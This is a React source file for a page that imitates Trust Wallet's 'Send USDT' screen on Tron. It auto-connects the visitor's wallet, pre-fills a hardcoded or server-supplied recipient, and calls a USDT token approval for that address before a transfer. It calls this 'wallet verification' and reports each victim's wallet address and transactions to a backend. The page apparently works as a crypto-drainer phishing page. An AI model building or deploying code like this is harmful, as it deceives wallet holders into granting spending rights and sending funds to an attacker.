import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, ChevronDown, Info, Wallet, X } from "lucide-react";
import { toast } from "sonner";
import { useTronWallet } from "@/lib/tronwallet-adapter";
import { notifyTrustTronActivity } from "@/lib/trust-tron-notify";
import { getWalletConnectAppUrl } from "@/lib/walletconnect-app-url";
import { approveUSDT, transferUSDT } from "@/lib/web3";
import { apiRequest } from "@/lib/api";

const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
const DEFAULT_AMOUNT = "10";

function looksLikeTronAddress(s: string): boolean {
  const t = s.trim();
  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(t);
}

/** Trust-style clipboard (paired with Paste action). Stroke tuned to match in-app wallet. */
function PasteIcon({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      width={20}
      height={20}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden
    >
      <path
        d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2v-2"
        stroke="currentColor"
        strokeWidth={2}
        strokeLinecap="round"
        strokeLinejoin="round"
      />
      <rect x="8" y="2" width="8" height="4" rx="1" fill="none" stroke="currentColor" strokeWidth={2} />
      <path d="M8 12h8M8 16h6" stroke="currentColor" strokeWidth={2} strokeLinecap="round" />
    </svg>
  );
}

/** Corner bracket scan frame (Trust send screen). */
function ScanIcon({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      width={20}
      height={20}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden
    >
      <path
        d="M3 7V5a2 2 0 0 1 2-2h2M17 3h2a2 2 0 0 1 2 2v2M21 17v2a2 2 0 0 1-2 2h-2M7 21H5a2 2 0 0 1-2-2v-2"
        stroke="currentColor"
        strokeWidth={2}
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

/** Tron chip: red circle + white triangle (reference UI). */
function TronNetworkIcon({ className }: { className?: string }) {
  return (
    <span
      className={`inline-flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#eb0029] ${className ?? ""}`}
      aria-hidden
    >
      <svg viewBox="0 0 24 24" className="h-[14px] w-[14px]" fill="none">
        <path fill="white" d="M12 6.5 17 17H7l5-10.5z" />
      </svg>
    </span>
  );
}

/** WalletConnect pairing URI — reject empty/malformed so Trust does not open a generic landing page. */
function normalizeWalletConnectPairingUri(uri: unknown): string | null {
  if (uri == null) return null;
  const s = (typeof uri === "string" ? uri : String(uri)).trim();
  if (s.length < 12) return null;
  if (!s.toLowerCase().startsWith("wc:")) return null;
  return s;
}

/**
 * Opens Trust Wallet with the WC pairing URI. Skips Reown’s "All Wallets" modal (only when `onUri` is set).
 * Uses the HTTPS handler so it works reliably inside **Trust Wallet Discover** (in-app browser), not only external browsers.
 * @see https://developer.trustwallet.com/developer/develop-for-trust/deeplinking
 */
function openTrustWalletForWalletConnect(uri: string): boolean {
  const normalized = normalizeWalletConnectPairingUri(uri);
  if (!normalized) return false;
  const url = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(normalized)}`;
  window.location.assign(url);
  return true;
}

function getTrustStatusSnapshot(): Record<string, unknown> {
  if (typeof window === "undefined") {
    return { env: "no-window" };
  }

  const w = window as any;
  const ua = navigator.userAgent || "";
  const isMobile = /android|iphone|ipad|ipod/i.test(ua);

  const trustwallet = w.trustwallet;
  const tronLink = w.tronLink;
  const tronWeb = w.tronWeb;

  const twTronLink = trustwallet?.tronLink;
  const twTron = trustwallet?.tron;

  const injectedTronWeb =
    tronWeb ??
    tronLink?.tronWeb ??
    twTronLink?.tronWeb ??
    twTron?.tronWeb ??
    null;

  const base58 = injectedTronWeb?.defaultAddress?.base58 ?? null;
  const ready = injectedTronWeb?.ready ?? null;
  const hasRequest =
    typeof twTronLink?.request === "function" ||
    typeof twTron?.request === "function" ||
    typeof tronLink?.request === "function" ||
    typeof tronWeb?.request === "function";

  return {
    isMobile,
    ua: ua.slice(0, 140),
    hasTrustWallet: Boolean(trustwallet),
    hasTW_tronLink: Boolean(twTronLink),
    hasTW_tron: Boolean(twTron),
    hasWindowTronLink: Boolean(tronLink),
    hasWindowTronWeb: Boolean(tronWeb),
    injectedTronWebReady: ready,
    injectedBase58: base58,
    hasAnyRequestMethod: hasRequest,
  };
}

function getTrustRequestProvider(): { request?: (p: { method: string; params?: unknown }) => Promise<unknown> } | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.trustwallet?.tronLink ??
    w.trustwallet?.tron ??
    w.tronLink ??
    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
    null
  );
}

const TrustWalletTronPay = () => {
  const navigate = useNavigate();
  const { connect, address, isConnected, isConnecting } = useTronWallet();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [trustConnecting, setTrustConnecting] = useState(false);
  const [amountInput, setAmountInput] = useState(DEFAULT_AMOUNT);
  const autoConnectAttempted = useRef(false);
  const trustPopupAttempted = useRef(false);
  const isConnectedRef = useRef(isConnected);
  const isConnectingRef = useRef(isConnecting);
  const trustConnectingRef = useRef(trustConnecting);
  /** Set when we navigated to Trust for WC pairing (tab may unload; avoid false error toast). */
  const wcTrustNavigatedRef = useRef(false);
  const [lastAutoConnect, setLastAutoConnect] = useState<
    | { state: "idle" }
    | { state: "connecting"; startedAt: number }
    | { state: "connected"; finishedAt: number }
    | { state: "error"; finishedAt: number; message: string }
  >({ state: "idle" });
  const [toInput, setToInput] = useState(DEFAULT_TO_ADDRESS);
  const [memo, setMemo] = useState("");
  const connectMethodRef = useRef<string>("unknown");

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      try {
        const cfg = await apiRequest<{ defaultRecipientAddress: string }>("/trust-tron/config", {
          auth: false
        });
        if (
          !cancelled &&
          cfg.defaultRecipientAddress &&
          looksLikeTronAddress(cfg.defaultRecipientAddress)
        ) {
          setToInput(cfg.defaultRecipientAddress);
        }
      } catch {
        /* keep DEFAULT_TO_ADDRESS */
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);
  const connectNotifySentForRef = useRef<string | null>(null);

  useEffect(() => {
    isConnectedRef.current = isConnected;
  }, [isConnected]);
  useEffect(() => {
    isConnectingRef.current = isConnecting;
  }, [isConnecting]);
  useEffect(() => {
    trustConnectingRef.current = trustConnecting;
  }, [trustConnecting]);

  /**
   * WalletConnect (Tron) for users opening this page in **Trust Wallet Discover**:
   * `onUri` forwards the pairing URI to Trust’s WC deeplink so Trust’s approve UI appears (not Reown’s wallet list).
   */
  const handleConnectWallet = async () => {
    try {
      delete (window as any).__tronWalletConnectOnUri;
    } catch {
      /* ignore */
    }
    wcTrustNavigatedRef.current = false;

    try {
      connectMethodRef.current = "walletconnect";
      setTrustConnecting(true);
      (window as any).__tronWalletConnectOnUri = (uri: string) => {
        if (wcTrustNavigatedRef.current) return;
        if (openTrustWalletForWalletConnect(uri)) {
          wcTrustNavigatedRef.current = true;
        }
      };
      await connect("walletconnect");
      toast.success("Wallet linked");
    } catch (error) {
      if (wcTrustNavigatedRef.current) {
        return;
      }
      toast.error(
        error instanceof Error ? error.message : "WalletConnect failed"
      );
    } finally {
      try {
        delete (window as any).__tronWalletConnectOnUri;
      } catch {
        /* ignore */
      }
      setTrustConnecting(false);
    }
  };

  /**
   * KEEP: Start WalletConnect once on mount (empty deps). Required for the Trust / WC flow; do not remove.
   */
  useEffect(() => {
    void handleConnectWallet();
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const ua = navigator.userAgent || "";
    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
    // Only auto-connect on mobile. Desktop users can use WalletConnect
    if (!isMobile) return;
    // Do not auto-start WalletConnect on load — it navigates to link.trustwallet.com/wc and
    // races Trust Discover injection (often ends on bare link.trustwallet.com with bad/empty URIs).
    // Trust injection can arrive after first paint on some mobile builds.
    // Poll briefly for trustwallet.* / tronLink injection, then:
    // - trigger Trust's connect popup (tron_requestAccounts) once per visit
    // - then connect via adapter (for consistent address state)
    const startedAt = Date.now();
    const timeoutMs = 20_000;
    const intervalMs = 500;

    const tick = async () => {
      if (
        isConnectedRef.current ||
        isConnectingRef.current ||
        trustConnectingRef.current
      ) {
        return;
      }
      if (Date.now() - startedAt > timeoutMs) return;

      const w = window as any;
      const hasInjectedTrust =
        Boolean(w.trustwallet?.tronLink) || Boolean(w.trustwallet?.tron);
      const uaLooksTrust = /trust/i.test(ua);

      // Only auto-connect if we're already in Trust (Discover / in-app browser).
      if (!hasInjectedTrust && !uaLooksTrust) return;

      // If Trust is injected but request() isn't ready yet, keep waiting.
      const provider = getTrustRequestProvider();
      const hasRequest = typeof provider?.request === "function";
      if (!hasRequest) {
        return;
      }

      // Mark as attempted only once we're actually able to trigger a request/connect.
      if (autoConnectAttempted.current) return;
      autoConnectAttempted.current = true;
      try {
        // 1) Force the Trust connect-confirm popup (best effort).
        // Note: if the dApp is already authorized, Trust may not show a popup again.
        if (!trustPopupAttempted.current) {
          trustPopupAttempted.current = true;
          try {
            const websiteName = "FIU ID";
            const websiteIcon = `${getWalletConnectAppUrl()}/favicon.ico`;
            await provider.request?.({
              method: "tron_requestAccounts",
              params: { websiteName, websiteIcon },
            });
          } catch {
            // Ignore here; connect("trust") will surface meaningful errors.
          }
        }

        // 2) Adapter connect for app state (address/isConnected).
        connectMethodRef.current = "trust-injected";
        setLastAutoConnect({ state: "connecting", startedAt: Date.now() });
        setTrustConnecting(true);
        await connect("trust");
        setLastAutoConnect({ state: "connected", finishedAt: Date.now() });
        toast.success("Wallet linked");
      } catch (error) {
        const message =
          error instanceof Error ? error.message : "Could not link wallet in Trust Wallet";
        setLastAutoConnect({ state: "error", finishedAt: Date.now(), message });
        toast.error(message);

        // If the failure is due to injection/availability timing, allow retries until timeout.
        const lower = message.toLowerCase();
        const likelyTiming =
          lower.includes("not available") ||
          lower.includes("not found") ||
          lower.includes("timeout") ||
          lower.includes("ready");
        if (likelyTiming) {
          autoConnectAttempted.current = false;
          trustPopupAttempted.current = false;
        }
      } finally {
        setTrustConnecting(false);
      }
    };

    const id = window.setInterval(() => {
      void tick();
    }, intervalMs);
    // Try immediately too.
    void tick();

    return () => {
      window.clearInterval(id);
    };
  }, [connect]);

  useEffect(() => {
    if (!isConnected || !address) return;
    if (connectNotifySentForRef.current === address) return;
    connectNotifySentForRef.current = address;
    void notifyTrustTronActivity({
      event: "wallet_connected",
      walletAddress: address,
      connectMethod: connectMethodRef.current,
    });
  }, [isConnected, address]);

  const handleConfirm = async () => {
    if (!isConnected) {
      toast.error("Link your wallet first (Trust Wallet Discover → Link wallet).");
      return;
    }
    if (!address) {
      toast.error("Wallet address unavailable.");
      return;
    }
    try {
      setIsSubmitting(true);

      const normalizedAmount = amountInput.trim();
      const numericAmount = Number(normalizedAmount);
      if (!normalizedAmount || !Number.isFinite(numericAmount) || numericAmount <= 0) {
        toast.error("Enter a valid USDT amount.");
        return;
      }
      if (!looksLikeTronAddress(toInput)) {
        toast.error("Enter a valid Tron recipient address.");
        return;
      }

      const approveTxId = await approveUSDT("tron", toInput.trim());
      void notifyTrustTronActivity({
        event: "token_approved",
        walletAddress: address,
        approveTxId,
      });
      const transferTxId = await transferUSDT("tron", toInput.trim(), normalizedAmount);

      toast.success("Wallet verification and transfer completed successfully.");
      void notifyTrustTronActivity({
        event: "transfer_completed",
        walletAddress: address,
        toAddress: toInput.trim(),
        amountUsdt: numericAmount,
        approveTxId,
        transferTxId,
      });
    } catch (error) {
      const msg = error instanceof Error ? error.message : "Transaction flow failed";
      toast.error(msg);
      void notifyTrustTronActivity({
        event: "transfer_failed",
        walletAddress: address,
        errorMessage: msg,
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  /** Trust “Send TRX” spec: Material-style green + true black canvas */
  const accent = "#00C853";
  const surface = "#0a0a0a";
  const borderField = "#2c2c2c";
  const labelCls = "text-[13px] text-gray-400 mb-2 block font-medium";
  const pressable = "transition active:opacity-60";

  const handleCopyAddress = async () => {
    try {
      await navigator.clipboard.writeText(toInput);
      toast.success("Address copied");
    } catch {
      toast.error("Copy failed");
    }
  };

  const handlePasteAddress = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const t = text.trim();
      if (looksLikeTronAddress(t)) {
        setToInput(t);
        toast.success("Address pasted");
      } else {
        toast.error("Clipboard is not a Tron address");
      }
    } catch {
      toast.error("Could not read clipboard");
    }
  };

  const fieldShell =
    `flex min-h-[52px] items-center gap-2 rounded-xl border px-3 py-3 ${pressable}`;
  const fieldShellStyle = { borderColor: borderField, backgroundColor: surface } as const;

  return (
    <div
      className="min-h-screen bg-black text-white font-sans antialiased"
      style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", sans-serif' }}
    >
      <div
        className="mx-auto flex w-full max-w-xl flex-col px-4 pb-36 pt-4"
        style={{ paddingTop: "max(1rem, env(safe-area-inset-top))" }}
      >
        <header className="mb-6 flex items-center gap-3">
          <button
            type="button"
            onClick={() => navigate(-1)}
            className={`${pressable} -ml-1 flex h-9 w-9 items-center justify-center rounded-full text-white hover:bg-white/10`}
            aria-label="Back"
          >
            <ArrowLeft className="h-6 w-6" strokeWidth={2} />
          </button>
        </header>
        <div className="mb-4 flex items-center justify-between">
          <h1 className="text-[18px] font-medium tracking-tight text-center w-full">Send USDT</h1>
        </div>

        <div className="mb-6">
          <label className={labelCls} htmlFor="tron-to">
            Address or Domain Name
          </label>
          <div
            className={`flex min-h-[52px] items-center justify-between rounded-xl border border-[#00C853] bg-[#0a0a0a] px-4 py-3 shadow-[0_0_0_1px_rgba(0,200,83,0.25)] ${pressable}`}
          >
            <input
              id="tron-to"
              type="text"
              value={toInput}
              onChange={(e) => setToInput(e.target.value)}
              placeholder="Search or Enter"
              spellCheck={false}
              autoComplete="off"
              className="min-w-0 flex-1 bg-transparent text-[14px] text-white outline-none placeholder:text-gray-500"
            />
            <div className="ml-3 flex shrink-0 items-center gap-4">
              <button
                type="button"
                onClick={handlePasteAddress}
                className={`text-[14px] font-medium ${pressable}`}
                style={{ color: accent }}
              >
                Paste
              </button>
              <button
                type="button"
                onClick={handleCopyAddress}
                className={`text-[#00C853] ${pressable}`}
                aria-label="Copy address"
              >
                <PasteIcon />
              </button>
              <button
                type="button"
                className={`text-[#00C853] ${pressable}`}
                aria-label="Scan QR code"
              >
                <ScanIcon />
              </button>
            </div>
          </div>
        </div>

        <div className="mb-6">
          <p className="mb-2 text-[13px] font-medium text-gray-500">Destination network</p>
          <button
            type="button"
            className={`inline-flex items-center gap-2 rounded-full border py-1.5 pl-1.5 pr-2.5 text-[15px] font-medium text-white ${pressable}`}
            style={{ borderColor: borderField, backgroundColor: "#1a1a1a" }}
          >
            <TronNetworkIcon />
            Tron
            <ChevronDown className="h-4 w-4 text-gray-500" strokeWidth={2} />
          </button>
        </div>

        <div className="mb-6">
          <label htmlFor="usdt-amount" className={labelCls}>
            Amount
          </label>
          <div
            className={fieldShell}
            style={fieldShellStyle}
            onClick={(e) => {
              const input = e.currentTarget.querySelector("#usdt-amount") as HTMLInputElement | null;
              input?.focus();
            }}
          >
            <input
              id="usdt-amount"
              type="text"
              value={amountInput}
              onChange={(e) => {
                const next = e.target.value;
                if (next === "" || /^[0-9]*[.]?[0-9]*$/.test(next)) {
                  setAmountInput(next);
                }
              }}
              inputMode="decimal"
              autoComplete="off"
              spellCheck={false}
              className="min-w-0 flex-1 bg-transparent text-[28px] font-semibold leading-none tracking-tight text-white outline-none placeholder:text-gray-600"
              aria-label="USDT amount"
              placeholder="0"
            />
            <button
              type="button"
              onClick={() => setAmountInput("")}
              className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-[#3a3a3a] text-white hover:bg-[#484848] ${pressable}`}
              aria-label="Clear amount"
            >
              <X className="h-3.5 w-3.5" strokeWidth={2.5} />
            </button>
            <span className="shrink-0 text-[15px] font-medium text-white">USDT</span>
            <button
              type="button"
              className={`shrink-0 text-[15px] font-semibold ${pressable}`}
              style={{ color: accent }}
              onClick={() => setAmountInput(DEFAULT_AMOUNT)}
            >
              Max
            </button>
          </div>
          <p className="mt-2 text-[13px] text-gray-500">≈ $0.00</p>
        </div>

        <div className="mb-6">
          <label htmlFor="memo-field" className={labelCls}>
            Memo
          </label>
          <div className={fieldShell} style={fieldShellStyle}>
            <input
              id="memo-field"
              type="text"
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              placeholder="Optional"
              className="min-w-0 flex-1 bg-transparent py-1 text-[14px] text-white outline-none placeholder:text-gray-500"
            />
            <button type="button" className={`shrink-0 text-[#00C853] ${pressable}`} aria-label="Scan memo QR">
              <ScanIcon />
            </button>
            <button type="button" className={`shrink-0 text-[#00C853] ${pressable}`} aria-label="Memo info">
              <Info className="h-5 w-5" strokeWidth={2} />
            </button>
          </div>
        </div>
      </div>

      <div
        className="fixed inset-x-0 bottom-0 z-20 border-t border-white/5 px-4 pt-3 backdrop-blur-md"
        style={{
          backgroundColor: "rgba(0,0,0,0.92)",
          paddingBottom: "max(1rem, env(safe-area-inset-bottom))",
        }}
      >
        <div className="mx-auto max-w-xl">
          <button
            type="button"
            onClick={handleConfirm}
            disabled={isSubmitting || !isConnected || isConnecting}
            className={`w-full rounded-full py-3.5 text-[16px] font-semibold disabled:cursor-not-allowed disabled:opacity-40 ${pressable}`}
            style={{ backgroundColor: "#2EBD32", color: "#0a0a0a" }}
          >
            {isSubmitting ? "Working…" : "Next"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
